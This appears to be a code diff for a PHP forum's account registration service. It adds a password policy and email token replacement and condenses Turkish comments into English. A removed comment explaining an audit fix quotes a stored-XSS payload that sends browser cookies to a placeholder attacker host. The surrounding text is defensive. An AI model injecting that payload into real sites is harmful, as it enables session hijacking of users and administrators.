@@ -5,7 +5,9 @@ declare(strict_types=1);
 namespace App\Core\Account;
 
 use App\Core\Mail\CpMailerService;
+use App\Core\Security\Password\PasswordPolicy;
 use App\Core\Settings\SettingsRegistry;
+use App\Core\Token\TokenReplacer;
 use App\Entity\User;
 use App\Repository\UserRepository;
 use Doctrine\ORM\EntityManagerInterface;
@@ -13,7 +15,7 @@ use Symfony\Component\Routing\Generator\UrlGeneratorInterface;
 use Symfony\Contracts\Translation\TranslatorInterface;
 
 /**
- * MegaforBB AuthService::register() + AdminUserSettings akışının CPalius karşılığı.
+ * CPalius equivalent of MegaforBB AuthService::register() and AdminUserSettings flow.
  */
 final class AccountRegistrationService
 {
@@ -21,22 +23,10 @@ final class AccountRegistrationService
     public const FIELD_OPTIONAL = '1';
     public const FIELD_REQUIRED = '2';
 
-    /**
-     * Ad/soyad için izin verilen karakterler (denetim bulgusu SEC-03).
-     * Gerekçe ve tehdit modeli için validateNameField() docblock'una bakın.
-     *
-     * \p{L}  -> her alfabeden harf (Türkçe ğüşıöç, Kiril, Arapça, CJK…)
-     * \p{M}  -> birleşim işaretleri (aksanların ayrı kod noktası olduğu diller)
-     * ' - .  -> "O'Brien", "Jean-Luc", "Dr. Ayşe" gibi meşru adlar
-     * boşluk -> çok parçalı adlar
-     */
+    /** Allowed name chars (SEC-03): \p{L}/\p{M}, space, apostrophe, hyphen, period. See validateNameField(). */
     private const NAME_PATTERN = "/^[\p{L}\p{M}\x{0020}\x{00A0}'\x{2019}.\-]+$/u";
 
-    /**
-     * Asset::$originalName gibi bir DB kolonu sınırı değil, bilinçli bir
-     * ürün kararıdır: 60 karakter, dünyadaki en uzun meşru adları bile
-     * rahat kapsar ve şablonlarda satır taşmasını önler.
-     */
+    /** Product limit (not a DB column cap): 60 chars covers long real names and prevents template overflow. */
     private const NAME_MAX_LENGTH = 60;
 
     public function __construct(
@@ -46,6 +36,8 @@ final class AccountRegistrationService
         private readonly UrlGeneratorInterface $urlGenerator,
         private readonly TranslatorInterface $translator,
         private readonly CpMailerService $mailerService,
+        private readonly TokenReplacer $tokenReplacer,
+        private readonly PasswordPolicy $passwordPolicy,
     ) {
     }
 
@@ -130,10 +122,15 @@ final class AccountRegistrationService
         $errors = array_merge($errors, $this->validateNameField('firstName', $this->firstNameMode(), trim($input['firstName'])));
         $errors = array_merge($errors, $this->validateNameField('lastName', $this->lastNameMode(), trim($input['lastName'])));
 
-        if (mb_strlen($password) < 8) {
-            $errors[] = $this->translator->trans('account.register.password_too_short');
-        } elseif ($password !== $passwordConfirm) {
+        if ($password !== $passwordConfirm) {
             $errors[] = $this->translator->trans('account.register.password_mismatch');
+        } else {
+            $errors = array_merge($errors, $this->passwordPolicy->validate($password, [
+                $email,
+                $username,
+                trim($input['firstName']),
+                trim($input['lastName']),
+            ]));
         }
 
         if ($this->isTermsRequired() && !$input['termsAccepted']) {
@@ -209,11 +206,20 @@ final class AccountRegistrationService
         }
 
         try {
+            // T2.4: translation catalog strings may additionally contain
+            // [user:display_name]/[site:name]-style tokens; a no-op for today's
+            // catalog values (no brackets in them), real once one is edited to add some.
+            $tokenContext = ['user' => $user];
+
             $this->mailerService->sendHtml(
                 $user->getEmail(),
-                $this->translator->trans('account.verify.email_subject'),
-                $this->translator->trans('account.verify.email_body_html', ['url' => $url, 'site' => $this->settingsRegistry->get('core.site_name') ?? 'CPalius']),
-                $this->translator->trans('account.verify.email_body_text', ['url' => $url]),
+                $this->tokenReplacer->replace($this->translator->trans('account.verify.email_subject'), $tokenContext, true),
+                $this->tokenReplacer->replace(
+                    $this->translator->trans('account.verify.email_body_html', ['url' => $url]),
+                    $tokenContext,
+                    true,
+                ),
+                $this->tokenReplacer->replace($this->translator->trans('account.verify.email_body_text', ['url' => $url]), $tokenContext),
             );
 
             return true;
@@ -223,43 +229,8 @@ final class AccountRegistrationService
     }
 
     /**
-     * Ad/soyad alanlarının doğrulaması (denetim bulgusu SEC-03).
-     *
-     * ── Neden bu metot sertleştirildi ────────────────────────────────────
-     *
-     * Önceki hâli YALNIZCA "boş mu" kontrolü yapıyordu: uzunluk sınırı,
-     * karakter kısıtı, HTML denetimi yoktu. Bu değer User::getFullName()
-     * üzerinden ForumTopic::$firstPosterName alanına DENORMALİZE edilerek
-     * kopyalanıyor ve forum konu listesinde basılıyordu. Şablonun o
-     * satırında "|raw" kullanıldığı için, kayıt açıkken kimliği
-     * doğrulanmamış bir ziyaretçi adına
-     *
-     *     <img src=x onerror="fetch('//evil/?c='+document.cookie)">
-     *
-     * yazarak listeyi gören HERKESTE — moderatörler ve yöneticiler dahil —
-     * script çalıştırabiliyordu.
-     *
-     * ── İki bağımsız katman ──────────────────────────────────────────────
-     *
-     * Bu metot BİRİNCİ katmandır: zararlı karakterler veritabanına hiç
-     * girmez. İKİNCİ katman şablon tarafındadır (forum/topics.html.twig,
-     * artık "|e" ile kaçırılıyor) ve asıl yükü o taşır — çünkü
-     * firstPosterName bir ANLIK GÖRÜNTÜdür: bu düzeltmeden önce kaydolmuş
-     * kullanıcıların adları veritabanında zaten durmaktadır ve girdi
-     * doğrulaması onları geriye dönük temizlemez.
-     *
-     * ── İzin verilen karakter kümesi ─────────────────────────────────────
-     *
-     * Unicode harfleri (\p{L}) ve birleşim işaretleri (\p{M}) — Türkçe,
-     * Arapça, Kiril, CJK dahil her alfabe çalışır. Ayrıca boşluk, tire,
-     * nokta ve kesme işareti: "Ali Çömez", "Jean-Luc", "O'Brien",
-     * "Dr. Ayşe" gibi meşru adlar bozulmadan geçer.
-     *
-     * "<", ">", "&", tırnak ve tüm kontrol karakterleri BİLİNÇLİ OLARAK
-     * dışarıda kalır — hiçbir meşru insan adında bulunmazlar ve tam olarak
-     * bu karakterler HTML enjeksiyonunu mümkün kılar. Rakam da dışarıdadır
-     * (ad alanı bir kullanıcı adı değildir; kullanıcı adı ayrıca ve daha
-     * dar bir kalıpla doğrulanır, bkz. validate()).
+     * Validates first/last name fields (audit SEC-03): length, charset, blocks HTML injection at registration.
+     * First defense layer; template escaping is the second (existing denormalized names are not retroactively cleaned).
      *
      * @return string[]
      */
@@ -278,7 +249,7 @@ final class AccountRegistrationService
                 )];
             }
 
-            // Opsiyonel ve boş: doğrulanacak bir şey yok.
+            // Optional and empty: nothing to validate.
             return [];
         }
 
@@ -290,8 +261,7 @@ final class AccountRegistrationService
             );
         }
 
-        // "u" bayrağı ZORUNLU: onsuz \p{L} çalışmaz ve çok baytlı
-        // karakterler bayt bayt değerlendirilir.
+        // "u" flag required: without it \p{L} fails and multibyte chars are matched per byte.
         if (preg_match(self::NAME_PATTERN, $value) !== 1) {
             $errors[] = $this->translator->trans(
                 $isFirstName ? 'account.register.first_name_invalid' : 'account.register.last_name_invalid',
